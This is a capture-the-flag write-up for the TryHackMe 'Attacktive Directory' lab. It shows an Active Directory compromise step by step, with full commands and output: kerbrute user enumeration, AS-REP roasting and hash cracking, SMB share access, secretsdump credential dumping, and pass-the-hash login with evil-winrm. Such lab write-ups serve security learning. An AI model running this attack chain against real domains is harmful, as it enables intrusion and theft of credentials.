---
title: Writeup - THM - Attacktive Directory
author: Fr3akazo1d!
date: 2020-11-03 
categories: [Hacking, Walkthrough]
tags: [tryhackeme, Active Direcotry, hacking, pwned, enum4linux, kerbrute]
image: /assets/img/thm-images/THM-AttactriveDirctory.png
image: /assets/img/thm-images/THM-AttactriveDirctory-1.png
---
# General Information

| Room        | Date        | Difficulty | Tags                               | Time |
| ----------- | ----------- | ---------- | ---------------------------------- | ---- |
| Attacktive Directory | 03.11.2020  | medium       | Active Directory, AD, Kerberos, SMB | 6h   |


# Used Programs

| Program  | Command |
| --------- | -------- |
| namp     | nmap -sC -sV -oN nmap/initial $ip|
| rustscan | rustscan $ip --ulimit 5000 -- -sC -sV -oN nmap/initial  tee output |
| enum4linux | enum4linux -d $ip | 
| kerbrute | ./kerbrute_linux_amd64 userenum -d spookysec.local --dc spookysec.local '/home/fr3akazo1d/Pen-Testing/THM/Boxes/AttractiveDirectory/user.txt' |
| GetNPUser.py | python3 GetNPUsers.py spookysec.local/s*******n -no-pass |
| JohnTheRipper | sudo john kerberushash --wordlist=password.txt  |
| metapsloit | msf6 auxiliary(admin/smb/download_file) |
| smbclient | smbclient \\\\spookysec.local\\backup -U s*******n |
| secretsdump.py | python3 secretsdump.py -just-dc backup@spookysec.local |
| evil-winrm | evil-winrm -u administrator -H 0e0363213e37b94221497260b0bcb4fc -i 10.10.124.175 |

# Usefull Information 

I have added the IP-Address of the room to my local /etc/hosts file, because we need it for further enumeration of the domain controller. 

# Impacket

For this Room we have to install Impacket. 

## Installing Impacket:

First, you'll want to clone the repo with:

git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket

This will clone Impacket to /opt/impacket/, after the repo is cloned, you will notice several install related files, requirements.txt, and setup.py. Setup.py is commonly skipped during the installation. It's key that you DO NOT miss it.

So let's install the requirements:

pip3 install -r /opt/impacket/requirements.txt

Once all the python modules are installed, we can then run the python setup install script:

cd /opt/impacket/ && python3 ./setup.py install

After that, Impacket should be correctly installed now and it should be ready to use!


If you are still having issues, you can try the following:
sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
sudo pip3 install -r /opt/impacket/requirements.txt
sudo cd /opt/impacket/ 
sudo pip3 install .
sudo python3 setup.py install

# Enumerating the DC

We used the the script "enum4linux" to enumerate the Target.

```sh 
┌──(fr3akazo1d💀fr3ak0ut)-[~/Pen-Testing/THM/Boxes/AttacktriveDirectory]
└─$ enum4linux -d $ip | tee enum4linux.txt                                                                                                                                                                                              130 ⨯
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Nov  3 21:10:45 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.124.175
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 10.10.124.175    |
 ===================================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[E] Can't find workgroup/domain


 ====================================== 
|    Session Check on 10.10.124.175    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
[+] Server 10.10.124.175 allows sessions using username '', password ''
[+] Got domain/workgroup name: 

 ============================================ 
|    Getting domain SID for 10.10.124.175    |
 ============================================ 
Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963
[+] Host is part of a domain (not a workgroup)
enum4linux complete on Tue Nov  3 21:10:57 2020
```

# Enumerating the DC Pt2

The next step is to use the program "kerbrute" to get the username of the Domain. 

```sh 
┌──(fr3akazo1d💀fr3ak0ut)-[/git/kerbrute]
└─$ ./kerbrute_linux_amd64 userenum -d spookysec.local --dc spookysec.local '/home/fr3akazo1d/Pen-Testing/THM/Boxes/AttacktriveDirectory/user.txt'

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/03/20 - Ronnie Flathers @ropnop

2020/11/03 21:28:23 >  Using KDC(s):
2020/11/03 21:28:23 >  	spookysec.local:88

2020/11/03 21:28:23 >  [+] VALID USERNAME:	 j***s@spookysec.local
2020/11/03 21:28:25 >  [+] VALID USERNAME:	 s*******n@spookysec.local
2020/11/03 21:28:26 >  [+] VALID USERNAME:	 J***s@spookysec.local
2020/11/03 21:28:26 >  [+] VALID USERNAME:	 r***n@spookysec.local
2020/11/03 21:28:32 >  [+] VALID USERNAME:	 d******r@spookysec.local
2020/11/03 21:28:35 >  [+] VALID USERNAME:	 a***********r@spookysec.local
2020/11/03 21:28:42 >  [+] VALID USERNAME:	 b****p@spookysec.local
2020/11/03 21:28:46 >  [+] VALID USERNAME:	 p*****x@spookysec.local
2020/11/03 21:29:07 >  [+] VALID USERNAME:	 J***S@spookysec.local
2020/11/03 21:29:15 >  [+] VALID USERNAME:	 R***n@spookysec.local
2020/11/03 21:29:57 >  [+] VALID USERNAME:	 A***********r@spookysec.local
2020/11/03 21:31:25 >  [+] VALID USERNAME:	 D******r@spookysec.local
2020/11/03 21:31:52 >  [+] VALID USERNAME:	 P*****x@spookysec.local
2020/11/03 21:33:24 >  [+] VALID USERNAME:	 D******R@spookysec.local
2020/11/03 21:33:51 >  [+] VALID USERNAME:	 o*i@spookysec.local
2020/11/03 21:34:41 >  [+] VALID USERNAME:	 R***N@spookysec.local
2020/11/03 21:39:46 >  Done! Tested 100000 usernames (16 valid) in 682.522 seconds

```

Kerbrute found some Username for the Domain. 


# Exploiting Kerberos

For a kerberus Ticket we use the program "GetNPUser.py" script from impacket. This will receive a kerberus hash.
This has can be cracked with the provided Password list from this room and johntheripper.

```sh 
python3 GetNPUsers.py spookysec.local/s******n-no-pass 
Impacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for s******n
$krb5asrep$23$s******n@SPOOKYSEC.LOCAL:a***********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************b
```

Hashcracking with JohnTheRipper:

```sh
┌──(fr3akazo1d💀fr3ak0ut)-[~/Pen-Testing/THM/Boxes/AttacktriveDirectory]
└─$ sudo john kerberushash --wordlist=password.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
m************5   ($krb5asrep$23$s*******n@SPOOKYSEC.LOCAL)
1g 0:00:00:00 DONE (2020-11-03 21:45) 16.66g/s 110933p/s 110933c/s 110933C/s horoscope..amy123
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

found a password for the user "s*******n"

# Enumerating the DC pt3

For this step we will have a look at the SMB-Share. We can check if we can download a folder on the Share. 

```sh
┌──(fr3akazo1d💀fr3ak0ut)-[~/Pen-Testing/THM/Boxes/AttacktriveDirectory]
└─$ smbmap -H spookysec.local -d spookysec.local -u s*******n -p m************5                                  1 ⨯
[+] IP: spookysec.local:445	Name: unknown                                           
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	b****p                                            	READ ONLY	
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
```

We can use metasploit for download a specific file from the b****p folder. 

```sh
msf6 auxiliary(admin/smb/download_file) > show options

Module options (auxiliary/admin/smb/download_file):

   Name         Current Setting         Required  Description
   ----         ---------------         --------  -----------
   FILE_RPATHS                          no        A file containing a list remote files relative to the share to operate on
   RHOSTS       10.10.124.175           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPATH        b****************s.txt  no        The name of the remote file relative to the share to operate on
   RPORT        445                     yes       The SMB service port (TCP)
   SMBDomain    spookysec.local         no        The Windows domain to use for authentication
   SMBPass      m************5          no        The password for the specified username
   SMBSHARE     b****p                  yes       The name of a share on the RHOST
   SMBUser      s*******n               no        The username to authenticate as
   THREADS      1                       yes       The number of concurrent threads (max one per host)
```

Or we can use smbclient to connect to the B*****p-Share and read the file on the share. 

```sh
┌──(fr3akazo1d💀fr3ak0ut)-[~/Pen-Testing/THM/Boxes/AttacktriveDirectory]
└─$ smbclient \\\\spookysec.local\\backup -U s*******n                       
Enter WORKGROUP\svc-admin's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 21:08:39 2020
  ..                                  D        0  Sat Apr  4 21:08:39 2020
  b****************s..txt              A       48  Sat Apr  4 21:08:53 2020

		8247551 blocks of size 4096. 3879238 blocks available
smb: \> more ****************s..txt 
getting file \****************s..txt of size 48 as /tmp/smbmore.qexQe1 (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> 
```

we now have a base64 hash, we can decode the hash and we have now the password for the b****p user. 

With this user we cann run the script from impacket "secretdump.py" to get the hashes of everyuser on the domain. 

```sh                                                                                                               
┌──(fr3akazo1d💀fr3ak0ut)-[/git/impacket/examples]
└─$ python3 secretsdump.py -just-dc b****p@spookysec.local
Impacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0******************************c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:3******************************0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0******************************1:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5******************************4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5******************************4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9******************************b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:4******************************e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b******************************b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:c******************************7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c******************************a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:6******************************b:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:0******************************2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3******************************5:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:4******************************4:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:f******************************9:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:1******************************8:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0******************************c:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:5******************************4:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:7**************************************************************8
Administrator:aes128-cts-hmac-sha1-96:e******************************e
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b**************************************************************c
krbtgt:aes128-cts-hmac-sha1-96:e******************************2
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3**************************************************************4
spookysec.local\skidy:aes128-cts-hmac-sha1-96:4******************************3
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4**************************************************************5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:3******************************5
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1**************************************************************2
spookysec.local\james:aes128-cts-hmac-sha1-96:0******************************6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:f**************************************************************e
spookysec.local\optional:aes128-cts-hmac-sha1-96:0******************************0
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:8**************************************************************d
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c******************************e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:3**************************************************************9
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:4******************************e
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5**************************************************************7
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5******************************e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8**************************************************************3
spookysec.local\robin:aes128-cts-hmac-sha1-96:7******************************8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:6**************************************************************0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f******************************8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:8**************************************************************7
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2******************************a
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:8**************************************************************6
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c******************************c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:e**************************************************************8
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:a******************************f
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:2**************************************************************2
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:c**************************************************************2
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:3******************************8
spookysec.local\a-spooks:des-cbc-md5:e**************9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:f**************************************************************6
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:f******************************5
ATTACKTIVEDIREC$:des-cbc-md5:1**************d
[*] Cleaning up... 
```


# Elevating Privilages

Now we got the hashes we can try to login in to the target. 
I used for the first time "Evil-WinRM" this is very powerfull tool. i have to explain in more detail when i used it more. 

But for this room i followed the instaruction ont the github page. 

We can login with the has of the a***********r to the target and then get all the flags of the other user. 

```sh                                                                                                                
┌──(fr3akazo1d💀fr3ak0ut)-[~/Pen-Testing/THM/Boxes/AttacktriveDirectory]
└─$ evil-winrm -u a***********r -H 0******************************c -i 10.10.124.175                            127 ⨯

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint


*Evil-WinRM* PS C:\Users\A***********r\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\A***********r\Desktop> ls


    Directory: C:\Users\A***********r\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  11:39 AM             32 root.txt


*Evil-WinRM* PS C:\Users\A***********r\Desktop> more root.txt
T******************************}

*Evil-WinRM* PS C:\Users\A***********r\Documents> cd ../../
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/17/2020   4:04 PM                a-spooks
d-----        9/17/2020   4:02 PM                A***********r
d-----         4/4/2020  12:19 PM                b****p
d-----         4/4/2020   1:07 PM                b****p.THM-AD
d-r---         4/4/2020  11:19 AM                Public
d-----         4/4/2020  12:18 PM                s*******n


*Evil-WinRM* PS C:\Users> cd b****p
*Evil-WinRM* PS C:\Users\b****p> cd Desktop
*Evil-WinRM* PS C:\Users\b****p\Desktop> ls


    Directory: C:\Users\b****p\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  12:19 PM             26 PrivEsc.txt


*Evil-WinRM* PS C:\Users\b****p\Desktop> more PrivEsc.txt
T**********************y!}

*Evil-WinRM* PS C:\Users\b****p\Desktop> cd ../../s*******n/Desktop
*Evil-WinRM* PS C:\Users\s*******n\Desktop> ls


    Directory: C:\Users\ss*******n\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  12:18 PM             28 user.txt.txt


*Evil-WinRM* PS C:\Users\s*******n\Desktop> cat user.txt.txt
T************************h}
*Evil-WinRM* PS C:\Users\s*******n\Desktop> 
```

# Summary

I learnd a lot in this room about attackting the Active Directory. Some Tools i have used for the first time. So i had to goolge the usage of the tools. But now i have a better understanding how i can enumerate a windows Active Directory. 
